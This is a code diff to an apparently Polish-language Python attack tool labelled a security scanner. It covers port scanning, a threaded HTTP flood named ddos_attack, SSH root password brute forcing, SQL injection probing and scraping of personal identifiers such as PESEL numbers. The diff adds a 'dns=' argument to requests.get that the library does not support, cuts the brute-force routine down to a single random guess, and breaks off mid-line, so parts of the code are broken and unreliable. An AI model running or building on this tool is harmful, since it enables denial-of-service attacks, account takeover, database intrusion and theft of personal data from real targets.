@@ -13,6 +13,9 @@ import sys
 # Stałe
 TIMEOUT = 0.5
 
+# Lista serwerów DNS (możesz dowolnie zmieniać lub dodawać inne)
+DNS_SERVERS = ['1.1.1.1', '1.0.0.1', '8.8.8.8', '8.8.4.4']
+
 # Inicjalizacja loggera
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
@@ -27,13 +30,10 @@ def scan_ports(target, start_port, end_port):
                 s.settimeout(TIMEOUT)
                 s.connect((target, port))
                 open_ports.append(port)
-                logging.info(f"Port {port} is open")
+                logging.info(f"Found open port: {port}")
         except:
-            logging.info(f"Port {port} is closed")
-    if open_ports:
-        logging.info(f"Open ports: {open_ports}")
-    else:
-        logging.info("No open ports found")
+            pass
+    return open_ports
 
 def ddos_attack(target, num_requests=None):
     """
@@ -43,10 +43,13 @@ def ddos_attack(target, num_requests=None):
 
     def send_request():
         try:
-            requests.get(target)
-            logging.info("Sent request to target")
-        except:
-            logging.error("Failed to send request to target")
+            # Wybierz losowy serwer DNS
+            dns_server = random.choice(DNS_SERVERS)
+            # Ustaw adres IP serwera DNS jako parametr dns
+            response = requests.get(target, dns=(dns_server, dns_server))
+            logging.info(f"Sent request to target using DNS server: {dns_server}")
+        except Exception as e:
+            logging.error(f"Failed to send request to target: {e}")
 
     threads = []
     for i in range(num_requests):
@@ -69,22 +72,24 @@ def brute_force(target, passwords_file):
             with open(passwords_file, "r") as f:
                 passwords = f.readlines()
                 if passwords:
-                    for password in passwords:
-                        password = password.strip()
-                        try:
-                            ssh.connect(target, username="root", password=password)
-                            logging.info(f"Brute force successful. Found password: {password}")
-                            return
-                        except:
-                            logging.info(f"Brute force unsuccessful for password: {password}")
+                    password = random.choice(passwords).strip()
+                    try:
+                        ssh.connect(target, username="root", password=password)
+                        logging.info(f"Brute force successful. Found password: {password}")
+                        return password
+                    except Exception as e:
+                        logging.error(f"Brute force unsuccessful: {e}")
                 else:
                     logging.warning("Empty passwords file.")
-        except:
-            logging.error("Error reading passwords file.")
+        except Exception as e:
+            logging.error(f"Error reading passwords file: {e}")
             sys.exit(1)
     else:
         logging.error("Passwords file not found.")
         sys.exit(1)
+
+    logging.warning("Brute force unsuccessful. Password not found.")
+    return None
 
 def sql_injection(target_url, sql_file):
     """
@@ -103,16 +108,20 @@ def sql_injection(target_url, sql_file):
                             response = requests.get(url)
                             if "error" in response.text.lower() or "database" in response.text.lower():
                                 logging.info(f"SQL injection vulnerability found. Query: {repr(query)}, Response: {repr(response.text)}")
-                        except:
-                            logging.error("Error sending request for SQL injection test.")
+                                return query, response.text
+                        except Exception as e:
+                            logging.error(f"SQL injection test failed: {e}")
                 else:
                     logging.warning("Empty SQL file.")
-        except:
-            logging.error("Error reading SQL file.")
+        except Exception as e:
+            logging.error(f"Error reading SQL file: {e}")
             sys.exit(1)
     else:
         logging.error("SQL file not found.")
         sys.exit(1)
+
+    logging.warning("SQL injection vulnerability not found.")
+    return None
 
 def personal_data_scan(target_url):
     """
@@ -126,36 +135,11 @@ def personal_data_scan(target_url):
         "PESEL": r"\b\d{11}\b"
     }
 
-    data = []
     try:
-        response = requests.get(target_url)
+        # Wybierz losowy serwer DNS
+        dns_server = random.choice(DNS_SERVERS)
+        # Ustaw adres IP serwera DNS jako parametr dns
+        response = requests.get(target_url, dns=(dns_server, dns_server))
         soup = BeautifulSoup(response.text, 'html.parser')
         for key, pattern in patterns.items():
-            matches = soup.find_all(text=re.compile(pattern))
-            if matches:
-                logging.info(f"Found {key}: {matches}")
-    except:
-        logging.error("Error scanning personal data.")
-        sys.exit(1)
-
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Security Scanner")
-    parser.add_argument("-t", "--target", type=str, help="Target IP address or URL", required=True)
-    parser.add_argument("-a", "--action", type=str, choices=["scan_ports", "ddos", "brute_force", "sql_injection", "personal_data_scan"], help="Action to perform", required=True)
-    parser.add_argument("-sp", "--start_port", type=int, help="Start port for scanning")
-    parser.add_argument("-ep", "--end_port", type=int, help="End port for scanning")
-    parser.add_argument("-n", "--num_requests", type=int, help="Number of requests for DDoS attack")
-    parser.add_argument("-pf", "--passwords_file", type=str, help="File containing passwords for brute force attack")
-    parser.add_argument("-sf", "--sql_file", type=str, help="File containing SQL queries for SQL injection test")
-    args = parser.parse_args()
-
-    if args.action == "scan_ports":
-        scan_ports(args.target, args.start_port, args.end_port)
-    elif args.action == "ddos":
-        ddos_attack(args.target, args.num_requests)
-    elif args.action == "brute_force":
-        brute_force(args.target, args.passwords_file)
-    elif args.action == "sql_injection":
-        sql_injection(args.target, args.sql_file)
-    elif args.action == "personal_data_scan":
-        personal_data_scan(args.target)
+            matches =
